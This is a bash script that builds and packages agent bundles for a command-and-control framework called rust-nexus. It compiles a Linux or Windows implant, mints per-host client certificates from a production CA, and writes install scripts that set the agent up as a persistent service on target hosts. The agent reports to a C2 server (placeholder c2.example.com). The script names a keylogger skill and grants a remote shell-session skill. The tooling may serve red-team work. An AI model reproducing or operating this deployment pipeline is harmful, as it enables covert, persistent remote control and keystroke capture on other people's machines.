#!/usr/bin/env bash
# scripts/build-agent-bundles.sh — build + cert-mint + bundle for N agents.
#
# Builds the nexus-agent binary for the requested OS, mints N Ed25519 client
# certs against the existing prod CA (without touching or re-generating the
# CA), and emits per-host dist bundles under dist/agents/ as individual zip
# archives (<CN>.zip), each containing the binary, CA cert, per-host client
# cert/key, and an OS-appropriate install script.
#
# Usage:
#   ./scripts/build-agent-bundles.sh --os win --count 3 --prod
#   ./scripts/build-agent-bundles.sh --os lin --count 2 --prod --start-index 4
#   ./scripts/build-agent-bundles.sh --os win --count 3 --certs-dir ./certs/dev
#   ./scripts/build-agent-bundles.sh --os win --count 3 --prod --no-build --force
#
# Required:
#   --os lin|win         target OS (lin = Linux x86-64, win = Windows x86-64)
#   --count N            number of per-host bundles to produce
#   --prod OR --certs-dir PATH   exactly one cert source must be provided
#
# Optional:
#   --prod               use ./certs/prod as the CA source (shorthand for
#                        --certs-dir ./certs/prod); mutually exclusive with
#                        --certs-dir
#   --start-index N      start numbering at N (default 1); use to add more
#                        agents without colliding with existing CNs
#   --prefix NAME        override the CN prefix (default: agent-lin or
#                        agent-win depending on --os)
#   --certs-dir PATH     directory containing ca.crt.pem + ca.key.pem;
#                        mutually exclusive with --prod
#   --out PATH           bundle output root (default: ./dist/agents)
#   --server-addr URL    C2 address written into per-bundle env/config
#                        (default: $NEXUS_C2_ADDR or https://c2.example.com:50052)
#   --days N             client cert validity in days (default: 365)
#   --no-build           skip cargo build; fail if artifact is missing
#   --force              overwrite existing zip files (mints fresh certs,
#                        invalidating previous ones for that host)
#   -h | --help          print this help and exit
#
# Requires: openssl >= 1.1.1, zip, cargo (unless --no-build),
#           x86_64-w64-mingw32-gcc (win target only, unless --no-build)

set -euo pipefail

# ---------- defaults ----------
OS=""
COUNT=""
START_INDEX=1
PREFIX=""
CERTS_DIR=""
PROD=0
OUT_DIR="./dist/agents"
SERVER_ADDR="${NEXUS_C2_ADDR:-https://c2.example.com:50052}"
DAYS=365
NO_BUILD=0
FORCE=0

log() { echo "[build-agent-bundles] $*"; }
die() { echo "[build-agent-bundles] error: $*" >&2; exit 2; }

usage() {
    sed -n '/^#!/d; /^#/!q; s/^# \{0,1\}//; p' "$0"
    exit 0
}

# ---------- arg parsing ----------
while [[ $# -gt 0 ]]; do
    case "$1" in
        --os)           OS="$2"; shift 2 ;;
        --count)        COUNT="$2"; shift 2 ;;
        --start-index)  START_INDEX="$2"; shift 2 ;;
        --prefix)       PREFIX="$2"; shift 2 ;;
        --prod)         PROD=1; shift ;;
        --certs-dir)    CERTS_DIR="$2"; shift 2 ;;
        --out)          OUT_DIR="$2"; shift 2 ;;
        --server-addr)  SERVER_ADDR="$2"; shift 2 ;;
        --days)         DAYS="$2"; shift 2 ;;
        --no-build)     NO_BUILD=1; shift ;;
        --force)        FORCE=1; shift ;;
        -h|--help)      usage ;;
        *) die "unknown argument: $1" ;;
    esac
done

# ---------- validation ----------
[[ -n "$OS" ]]    || die "--os is required (lin or win)"
[[ -n "$COUNT" ]] || die "--count is required"

[[ "$OS" == "lin" || "$OS" == "win" ]] || die "--os must be 'lin' or 'win', got: $OS"

[[ "$COUNT" =~ ^[1-9][0-9]*$ ]]       || die "--count must be a positive integer, got: $COUNT"
[[ "$START_INDEX" =~ ^[1-9][0-9]*$ ]] || die "--start-index must be a positive integer, got: $START_INDEX"
[[ "$DAYS" =~ ^[1-9][0-9]*$ ]]        || die "--days must be a positive integer, got: $DAYS"

# Resolve cert source: --prod and --certs-dir are mutually exclusive
if [[ $PROD -eq 1 && -n "$CERTS_DIR" ]]; then
    die "--prod and --certs-dir are mutually exclusive"
elif [[ $PROD -eq 1 ]]; then
    CERTS_DIR="./certs/prod"
elif [[ -z "$CERTS_DIR" ]]; then
    CERTS_DIR="./certs/nexus-agent"  # default
fi

command -v openssl >/dev/null 2>&1 || die "openssl not found on PATH"
command -v zip     >/dev/null 2>&1 || die "zip not found on PATH (install with: sudo apt-get install zip)"
if [[ $NO_BUILD -eq 0 ]]; then
    command -v cargo >/dev/null 2>&1 || die "cargo not found on PATH (install rustup or pass --no-build)"
fi

# Set default prefix after OS is validated
if [[ -z "$PREFIX" ]]; then
    [[ "$OS" == "win" ]] && PREFIX="agent-win" || PREFIX="agent-lin"
fi

# Widen to %03d if the range exceeds 99
END_INDEX=$(( START_INDEX + COUNT - 1 ))
if [[ $END_INDEX -ge 100 ]]; then
    PAD="%03d"
else
    PAD="%02d"
fi

# ---------- CA validation ----------
CA_CRT="${CERTS_DIR}/ca.crt.pem"
CA_KEY="${CERTS_DIR}/ca.key.pem"

[[ -f "$CA_CRT" ]] || die "CA cert not found: $CA_CRT  (run scripts/gen-certs-prod.sh first)"
[[ -f "$CA_KEY" ]] || die "CA key not found: $CA_KEY  (run scripts/gen-certs-prod.sh first)"
[[ -r "$CA_KEY" ]] || die "CA key not readable: $CA_KEY  (check permissions)"

log "CA: $CA_CRT"
log "os=$OS count=$COUNT start_index=$START_INDEX prefix=$PREFIX"

# ---------- build phase ----------
if [[ $NO_BUILD -eq 1 ]]; then
    log "skipping build (--no-build)"
    if [[ "$OS" == "win" ]]; then
        ARTIFACT="target/x86_64-pc-windows-gnu/release/nexus-agent.exe"
    else
        ARTIFACT="target/release/nexus-agent"
    fi
    [[ -f "$ARTIFACT" ]] || die "artifact not found: $ARTIFACT  (drop --no-build to build it)"
    log "using existing artifact: $ARTIFACT"
else
    if [[ "$OS" == "win" ]]; then
        if ! command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
            die "MinGW cross-compiler not found. Install with:
  sudo apt-get install mingw-w64
  rustup target add x86_64-pc-windows-gnu"
        fi
        log "building nexus-agent for Windows (x86_64-pc-windows-gnu)"
        log "NOTE: keylogger BOF is stubbed when cross-compiling from Linux (build.rs uses"
        log "      cfg!(target_os=windows) which evaluates on the build host, not the target)."
        log "      The agent will run; the keylogger skill will not be available."
        cargo build --release --target x86_64-pc-windows-gnu -p nexus-agent --bin nexus-agent
        ARTIFACT="target/x86_64-pc-windows-gnu/release/nexus-agent.exe"
    else
        log "building nexus-agent for Linux"
        cargo build --release -p nexus-agent --bin nexus-agent
        ARTIFACT="target/release/nexus-agent"
    fi
    log "build complete: $ARTIFACT"
fi

# ---------- cert mint phase ----------
# All certs are minted into a temp dir first. If any step fails, the trap
# cleans up so certs/prod/ is never polluted with partial leaves.
TMPDIR_CERTS="$(mktemp -d)"
trap 'rm -rf "$TMPDIR_CERTS"' EXIT

cat > "${TMPDIR_CERTS}/client.ext.cnf" <<EOF
extendedKeyUsage = clientAuth
basicConstraints = critical, CA:false
keyUsage = critical, digitalSignature
EOF

log "minting $COUNT client cert(s) from $CA_CRT"
for i in $(seq "$START_INDEX" "$END_INDEX"); do
    CN="$(printf "${PREFIX}${PAD}" "$i")"
    log "  minting $CN"
    openssl genpkey -algorithm ED25519 \
        -out "${TMPDIR_CERTS}/${CN}.key.pem" \
        || die "keygen failed for ${CN}"
    openssl req -new \
        -key "${TMPDIR_CERTS}/${CN}.key.pem" \
        -out "${TMPDIR_CERTS}/${CN}.csr.pem" \
        -subj "/C=US/O=rust-nexus/OU=v1.2-prod-certs/CN=${CN}" \
        || die "CSR creation failed for ${CN}"
    openssl x509 -req \
        -in "${TMPDIR_CERTS}/${CN}.csr.pem" \
        -CA "$CA_CRT" -CAkey "$CA_KEY" -CAcreateserial \
        -days "$DAYS" \
        -out "${TMPDIR_CERTS}/${CN}.crt.pem" \
        -extfile "${TMPDIR_CERTS}/client.ext.cnf" \
        || die "cert signing failed for ${CN} — check that ${CA_CRT} is a CA cert (CA:TRUE)"
    rm -f "${TMPDIR_CERTS}/${CN}.csr.pem"
    chmod 600 "${TMPDIR_CERTS}/${CN}.key.pem"
    chmod 644 "${TMPDIR_CERTS}/${CN}.crt.pem"
done
# Remove any stray serial file from the CA dir that openssl -CAcreateserial may have written
rm -f "${CERTS_DIR}/ca.srl"

log "all certs minted cleanly"

# ---------- bundle phase ----------
mkdir -p "$OUT_DIR"

for i in $(seq "$START_INDEX" "$END_INDEX"); do
    CN="$(printf "${PREFIX}${PAD}" "$i")"
    BUNDLE="${OUT_DIR}/${CN}"

    ZIP_OUT="${OUT_DIR}/${CN}.zip"

    if [[ -f "$ZIP_OUT" ]]; then
        if [[ $FORCE -eq 0 ]]; then
            die "bundle zip already exists: $ZIP_OUT  (use --force to overwrite; this mints fresh certs)"
        fi
        log "  overwriting existing bundle zip: $ZIP_OUT (--force)"
        rm -f "$ZIP_OUT"
    fi
    # Clean up any leftover staging dir from a prior interrupted run
    [[ -d "$BUNDLE" ]] && rm -rf "$BUNDLE"

    mkdir -p "$BUNDLE"

    # binary (canonical name regardless of OS)
    if [[ "$OS" == "win" ]]; then
        cp "$ARTIFACT" "${BUNDLE}/nexus-agent.exe"
    else
        cp "$ARTIFACT" "${BUNDLE}/nexus-agent"
        chmod 755 "${BUNDLE}/nexus-agent"
    fi

    # CA cert
    cp "$CA_CRT" "${BUNDLE}/ca.crt.pem"
    chmod 644 "${BUNDLE}/ca.crt.pem"

    # per-host client cert + key
    cp "${TMPDIR_CERTS}/${CN}.crt.pem" "${BUNDLE}/client.crt.pem"
    cp "${TMPDIR_CERTS}/${CN}.key.pem" "${BUNDLE}/client.key.pem"
    chmod 644 "${BUNDLE}/client.crt.pem"
    chmod 600 "${BUNDLE}/client.key.pem"

    # ---------- OS-specific helpers ----------
    if [[ "$OS" == "lin" ]]; then
        # agent.env
        cat > "${BUNDLE}/agent.env" <<EOF
NEXUS_CA_CERT=/etc/nexus-agent/ca.crt.pem
NEXUS_CLIENT_CERT=/etc/nexus-agent/client.crt.pem
NEXUS_CLIENT_KEY=/etc/nexus-agent/client.key.pem
NEXUS_SERVER_ADDR=${SERVER_ADDR}
RUST_LOG=info
EOF

        # install-linux.sh
        cat > "${BUNDLE}/install-linux.sh" <<'SCRIPT_EOF'
#!/usr/bin/env bash
# install-linux.sh — deploy this nexus-agent bundle on a Linux host.
# Run as root (or with sudo).
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
INSTALL_ROOT="/etc/nexus-agent"
DATA_ROOT="/var/lib/nexus-agent"
SVC_USER="nexus-agent"
SVC_NAME="nexus-agent"

echo "[install] creating user and directories"
id "$SVC_USER" >/dev/null 2>&1 || \
    useradd --system --no-create-home --shell /usr/sbin/nologin "$SVC_USER"
mkdir -p "$INSTALL_ROOT" "$DATA_ROOT"
chown "$SVC_USER:$SVC_USER" "$DATA_ROOT"

echo "[install] installing files"
install -m 0755 -o root       -g root         "$SCRIPT_DIR/nexus-agent"     /usr/local/bin/nexus-agent
install -m 0644 -o root       -g nexus-agent  "$SCRIPT_DIR/ca.crt.pem"      "${INSTALL_ROOT}/ca.crt.pem"
install -m 0644 -o root       -g nexus-agent  "$SCRIPT_DIR/client.crt.pem"  "${INSTALL_ROOT}/client.crt.pem"
install -m 0600 -o nexus-agent -g nexus-agent "$SCRIPT_DIR/client.key.pem"  "${INSTALL_ROOT}/client.key.pem"
install -m 0640 -o root       -g nexus-agent  "$SCRIPT_DIR/agent.env"       "${INSTALL_ROOT}/agent.env"

echo "[install] writing systemd unit"
cat > /etc/systemd/system/nexus-agent.service <<EOF
[Unit]
Description=rust-nexus C2 agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=${SVC_USER}
EnvironmentFile=${INSTALL_ROOT}/agent.env
ExecStart=/usr/local/bin/nexus-agent
Restart=on-failure
RestartSec=10s
WorkingDirectory=${DATA_ROOT}

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable "$SVC_NAME"
systemctl restart "$SVC_NAME"
echo "[install] done. Tailing journal (ctrl-c to stop):"
journalctl -u "$SVC_NAME" -f
SCRIPT_EOF
        chmod 755 "${BUNDLE}/install-linux.sh"

    else
        # install.bat — thin launcher; the binary handles everything else.
        cat > "${BUNDLE}/install.bat" <<BATEOF
@echo off
echo [install] running nexus-agent.exe --install (requires Administrator)
"%~dp0nexus-agent.exe" --install
if %ERRORLEVEL% NEQ 0 (
    echo [install] FAILED with exit code %ERRORLEVEL%
    exit /b %ERRORLEVEL%
)
echo [install] done.
echo [install] verify:  sc query nexus-agent
echo [install] logs:    C:\ProgramData\nexus-agent\agent.log
echo [install] remove:  nexus-agent.exe --uninstall
BATEOF
    fi

    # ---------- README.txt ----------
    if [[ "$OS" == "win" ]]; then
        BOF_NOTE="NOTE: keylogger BOF is NOT included in this binary. This agent was
       cross-compiled from Linux; the BOF requires MSVC (cl.exe) on the
       build host. All other skills are fully functional."
        DEPLOY_STEPS="1. Copy this folder anywhere on the target host.
2. Open an elevated cmd.exe (right-click -> Run as administrator).
3. Run: install.bat   (or directly: nexus-agent.exe --install)
4. Verify: sc query nexus-agent
5. Check logs: C:\\ProgramData\\nexus-agent\\agent.log"
        LOG_PATH="C:\\ProgramData\\nexus-agent\\agent.log"
    else
        BOF_NOTE=""
        DEPLOY_STEPS="1. Copy this folder to the target Linux host.
2. Run as root: sudo bash install-linux.sh
3. Check logs: sudo journalctl -u nexus-agent -f"
        LOG_PATH="journalctl -u nexus-agent -f"
    fi

    cat > "${BUNDLE}/README.txt" <<EOF
nexus-agent bundle — ${CN}
============================================================

Agent CN  : ${CN}
Server    : ${SERVER_ADDR}
OS target : ${OS}
Cert valid: ${DAYS} days from issuance
CA issuer : $(openssl x509 -in "$CA_CRT" -noout -subject 2>/dev/null | sed 's/subject=//')

Deploy steps:
${DEPLOY_STEPS}

Logs:
  ${LOG_PATH}

After first start, the agent will emit its peer_id in the log:
  INFO NodeIdentity loaded identity_path=... peer_id=<hex>

The server will also log:
  INFO agent registered peer_id=<hex>

Add that peer_id to /etc/nexus/capabilities.json on the C2 server:
  {
    "agents": {
      "<peer_id>": { "skills": ["shell-session"], "label": "${CN}" }
    }
  }
Then restart nexus-server:
  sudo systemctl restart nexus-server

The NodeIdentity file on the agent host is the agent's permanent
identity. Back it up if you want the peer_id to survive a reinstall.
${BOF_NOTE:+
${BOF_NOTE}}
============================================================
EOF

    # ---------- zip + clean up staging dir ----------
    (cd "$OUT_DIR" && zip -qr "${CN}.zip" "${CN}")
    rm -rf "$BUNDLE"

    log "  bundle ready: $ZIP_OUT"
done

# ---------- summary ----------
cat <<EOF

[build-agent-bundles] done. ${COUNT} bundle(s) in: $(realpath "$OUT_DIR")

Bundles:
EOF

for i in $(seq "$START_INDEX" "$END_INDEX"); do
    CN="$(printf "${PREFIX}${PAD}" "$i")"
    ZIP_OUT="${OUT_DIR}/${CN}.zip"
    if [[ "$OS" == "win" ]]; then
        echo "  ${CN}.zip  →  ${ZIP_OUT}  (extract + run install.bat as Administrator)"
    else
        echo "  ${CN}.zip  →  ${ZIP_OUT}  (extract + sudo bash install-linux.sh)"
    fi
done

FIRST_CN="$(printf "${PREFIX}${PAD}" "$START_INDEX")"
cat <<EOF

Verify a cert (extract first):
  unzip -p ${OUT_DIR}/${FIRST_CN}.zip ${FIRST_CN}/client.crt.pem | \\
    openssl x509 -noout -subject -issuer

After each agent registers, add its peer_id to /etc/nexus/capabilities.json
on the C2 server and restart nexus-server.
EOF
